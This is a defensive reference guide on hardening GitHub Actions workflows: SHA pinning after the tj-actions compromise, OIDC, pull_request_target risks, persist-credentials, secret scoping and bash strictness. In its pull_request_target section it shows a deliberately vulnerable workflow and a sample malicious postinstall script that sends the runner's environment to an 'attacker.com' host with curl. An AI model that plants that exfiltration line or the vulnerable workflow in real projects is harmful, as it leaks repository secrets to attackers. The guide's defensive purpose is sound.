# Security hardening for GitHub Actions

Reference consumed by the `optimizing-github-actions` skill when the topic is workflow security. Covers 5 domains: SHA pinning, OIDC, `pull_request_target`, `persist-credentials`, secret scoping + bash hardening.

## 1. SHA pinning of third-party actions

### The incident that changed everything: tj-actions/changed-files (CVE-2025-30066, March 2025)

On March 14, 2025, an attacker compromised a PAT (Personal Access Token) with write permission to the `tj-actions/changed-files` repo. Within hours, the attacker rewrote **350+ Git tags** (including `v45`, `v44`, `v43`...) to point to a malicious commit. ~23 thousand repositories that depended on this action via tag (`uses: tj-actions/changed-files@v45`) executed the malicious code, which dumped runner secrets into public logs. CISA issued an official alert. Public repos with public workflow logs leaked secrets to anyone searching.

Accompanied by the similar `reviewdog/action-setup` incident (CVE-2025-30154) the same week.

**Lesson**: Git tags are **mutable pointers** — an attacker with write access can rewrite them in seconds. A commit SHA is **immutable** — once published, always points to the same content.

### SHA pinning syntax

**Wrong** (vulnerable):
```yaml
- uses: tj-actions/changed-files@v45
- uses: actions/checkout@v4   # official GitHub actions: lower risk but not zero
```

**Right** (resilient):
```yaml
- uses: tj-actions/changed-files@e9772d140489982e0e3704fea5ee93d536f1e275 # v45.0.7
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0  # OK: official
```

Inline comment with human-readable version makes Dependabot updates + human review easier.

### How to get the current SHA of a tag

```bash
# Resolve tag → SHA
gh api repos/tj-actions/changed-files/git/refs/tags/v45.0.7 --jq '.object.sha'

# Or via git
git ls-remote https://github.com/tj-actions/changed-files refs/tags/v45.0.7
```

### When to accept major version (`@vN`) without SHA

Acceptable **only** for official GitHub actions (`actions/checkout`, `actions/setup-node`, `actions/cache`, `actions/upload-artifact`, `actions/download-artifact`, `actions/github-script`). Low risk but not zero — compromising the `actions` org would require compromising GitHub itself. Mark with comment:

```yaml
- uses: actions/checkout@v5  # OK: official action
```

### Caveats 2026

- **Orphaned commits in forks**: SHA pinning doesn't prevent 100%. An attacker can create a commit in a fork that's still resolvable by SHA. Mitigation: 3-5 day cooldown before accepting Dependabot update + verify SHA matches official tagged release.
- **Dependabot quirks**: historically updated hash-pinned actions to the branch's latest commit (not the tagged release). Review Dependabot PRs manually.
- **GitHub Actions policy**: organizations can enable SHA-based block lists via Settings → Actions → General. Worth considering for larger orgs.

### Dependabot for actions

Add to `.github/dependabot.yml`:
```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

Combine with human review — do not auto-merge.

## 2. OIDC for cloud authentication

### Why OIDC replaces long-lived secrets

Long-lived secrets (`AWS_ACCESS_KEY_ID`, `GCP_SA_KEY`) have 3 problems officially recognized by GitHub:

1. **Duplication**: credential lives in 2 places (cloud + GitHub Secrets). Rotation needs to update both.
2. **No granular access**: the key grants everything the IAM role permits — no distinction between "this workflow" vs "another workflow".
3. **No automatic rotation**: key remains valid indefinitely. If leaked (in log, in accidental commit), attacker uses it for months.

OIDC replaces this with **ephemeral JWT**: GitHub Actions issues a short-lived token (~10min), signed, with claims about the specific workflow. The cloud provider validates via trust policy ("accept tokens where `repo == my-repo` and `branch == main`") and issues a temporary credential.

### Official support

| Cloud | Official action | Doc |
|-------|-----------------|-----|
| AWS | `aws-actions/configure-aws-credentials` | [docs.github.com OIDC AWS](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services) |
| GCP | `google-github-actions/auth` | [docs.github.com OIDC GCP](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform) |
| Azure | `azure/login` | [docs.github.com OIDC Azure](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-azure) |
| HashiCorp Vault | `hashicorp/vault-action` | https://developer.hashicorp.com/vault/docs/auth/jwt/oidc-providers/github |
| GitHub Container Registry | `${{ secrets.GITHUB_TOKEN }}` (built-in) | Already ephemeral OIDC |

### AWS syntax

```yaml
permissions:
  id-token: write   # Does NOT grant write to resources — only allows the job to request the JWT
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: us-east-1

      - name: Deploy
        run: aws s3 sync ./build s3://my-bucket
```

IAM role trust policy (in AWS):
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
      }
    }
  }]
}
```

The `token.actions.githubusercontent.com:sub` line is the heart of granular control: you can restrict by repo, branch, environment, or tag.

### When NOT to use OIDC

Long-lived secret is acceptable for:
- SSH keys for VPS/droplet access (most providers don't have native OIDC for SSH).
- API keys for SaaS without OIDC support (most third-party APIs).
- Webhook secrets and signing keys.

Mark explicitly:
```yaml
env:
  # OIDC not supported by <Service Name> — long-lived API key in secret
  SERVICE_API_KEY: ${{ secrets.SERVICE_API_KEY }}
```

## 3. `pull_request_target` — the classic RCE vector

### The problem

`pull_request` (default) runs in the PR head context — no secrets, in a sandboxed runner for fork modifications. Safe but limited.

`pull_request_target` runs in the **base repo** context — with repo secrets, with write permissions. Useful for workflows that need to comment on the PR, add labels, etc.

**Vulnerability**: if the `pull_request_target` workflow checks out the PR head code and executes anything (npm install with postinstall scripts, build, arbitrary test scripts), an attacker via fork PR gets a shell on the runner with access to base repo secrets.

### Vulnerable code (DO NOT DO)

```yaml
# .github/workflows/comment-on-pr.yml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build-and-comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ❌ RCE — checkout of PR head
      - run: npm install                                    # ❌ runs PR code
      - run: npm test                                       # ❌ runs PR code
      - run: gh pr comment ${{ github.event.pull_request.number }} --body "Tested!"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}            # ❌ secret exposed
```

Attacker submits a fork PR with `package.json`:
```json
{"scripts": {"postinstall": "curl -X POST attacker.com -d \"$(env)\""}}
```

`npm install` runs the postinstall, dumps runner env (including `GITHUB_TOKEN`) to the attacker.

### Safe code

**Option 1**: use `pull_request` instead of `pull_request_target` if you don't need secrets (default).

**Option 2**: if you need secrets (e.g., comment on PR), use `pull_request_target` but DON'T check out the PR head:
```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  comment:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - run: gh pr comment ${{ github.event.pull_request.number }} --body "Hello!"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      # ❗ Doesn't check out the PR. Doesn't run PR code. Safe.
```

**Option 3**: "split workflow" pattern (recommended by GitHub Security Lab). Workflow A runs on `pull_request` (no secrets), executes code, uploads artifact. Workflow B runs on `workflow_run` (triggered by A), with secrets, reads the artifact (which is data, not executable code).

### GitHub change November 2025

GitHub changed default behavior: `pull_request_target` now **always** uses default branch for workflow source/ref (until then, it could use PR head in some cases). This protects the workflow source itself — but does NOT protect workflows that explicitly check out PR head. It's still the developer's responsibility not to execute PR code.

## 4. `persist-credentials` in `actions/checkout`

### Default behavior

`actions/checkout` defaults to `persist-credentials: true`. Meaning: after checkout, Git credentials are configured for subsequent `git push` or `git fetch`.

**Risk**: subsequent steps (including third-party actions) can inspect `.git/config` or use the credential implicitly.

### Change in v6+

In `actions/checkout@v6`, credentials are stored in a separate file under `$RUNNER_TEMP` (no longer in `.git/config` directly). Reduces accidental inspection vector, but principle of least privilege still recommends explicitly setting `false` when checkout is read-only.

### Syntax

```yaml
# Workflow that only does build/test, doesn't need git push:
- uses: actions/checkout@v5
  with:
    persist-credentials: false  # ✅ Hardening: no persisted credential

# Workflow that does git push (release, auto-commit, etc):
- uses: actions/checkout@v5
  with:
    persist-credentials: true   # OK: needed for git push
    token: ${{ secrets.RELEASE_TOKEN }}  # Explicit token, not implicit credential
```

### When you need `persist-credentials: true`

- Workflows that do `git push` (releases, automatic version bumps, lockfile regeneration).
- Workflows that do `gh pr create` for a branch that needs Git authentication.
- Workflows with `git submodule update` that need credentials.

In all other cases (>90% of workflows): `false`.

## 5. Secret scoping (env: at the right level)

### The global `env:` problem

```yaml
# ❌ Secret exposed to all steps (including third-party actions)
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

jobs:
  build:
    steps:
      - uses: actions/checkout@v5
      - uses: untrusted/random-action@v1   # ❌ Has access to secrets via env
      - run: aws s3 sync ./dist s3://bucket
```

### Solution: secret at step level

```yaml
jobs:
  build:
    steps:
      - uses: actions/checkout@v5
      - uses: untrusted/random-action@v1   # ✅ No access to secrets
      - name: Deploy
        run: aws s3 sync ./dist s3://bucket
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}    # ✅ Only this step sees it
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

### Permissions: read-all default

Add at the top of the workflow:
```yaml
permissions: read-all   # Safe default
```

Then escalate only where needed:
```yaml
jobs:
  release:
    permissions:
      contents: write       # Only this job can do git push/release
      pull-requests: write
```

`GITHUB_TOKEN` is issued with the most restrictive permissions according to what the workflow declares.

## 6. Bash hardening in `run:` blocks

### The GHA default is `bash -eo pipefail` — but it's inconsistent

Official ADR of the GitHub Actions runner: default shell is `bash --noprofile --norc -eo pipefail {0}`. But in practice, `pipefail` doesn't always work as documented — `false | true` passes in some scenarios without explicit `pipefail` (issue #1212 of `actions/runner`).

### When to explicitly set `set -euo pipefail`

Whenever the `run:` has:
- Loops (`for ... in ...`, `while ...`).
- Pipes (`cmd1 | cmd2 | cmd3`).
- More than 5 lines of code.
- Destructive operations (rm, drop, delete).

### Syntax

```yaml
- name: Deploy services
  shell: bash
  run: |
    set -euo pipefail
    
    SERVICES=(api worker scheduler webhook-handler)
    for svc in "${SERVICES[@]}"; do
      echo "Deploying $svc..."
      deploy-cli deploy "$svc"
    done
```

Without `set -euo pipefail`, failure in one service doesn't stop the loop — other services are deployed in inconsistent state.

`set -e`: aborts on first error.
`set -u`: aborts if variable is undefined.
`set -o pipefail`: aborts if any command in the pipe fails (not just the last).

## 7. Other security patterns

- **Disable `default: true` on forks for workflows that touch secrets**. Settings → Actions → General → "Fork pull request workflows from outside collaborators": "Require approval for all outside collaborators".
- **Audit `secrets:` in reusable workflows**. `secrets: inherit` grants total inheritance — use explicit `secrets:` when possible.
- **Consider `step-security/harden-runner`** for runtime security monitoring (it has detected tj-actions in real runs).
- **Branch protection + required status checks** + "Restrict who can push to matching branches" — basic but frequently neglected.

## External references

- CISA tj-actions alert: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction
- StepSecurity SHA pinning guide: https://www.stepsecurity.io/blog/pinning-github-actions-for-enhanced-security-a-complete-guide
- GitHub Security Lab — Preventing pwn requests: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
- Orca pull_request_nightmare: https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/
- OIDC GitHub Actions: https://docs.github.com/en/actions/concepts/security/openid-connect
- `actions/checkout` README: https://github.com/actions/checkout
- Bash pipefail issue: https://github.com/actions/runner/issues/1212
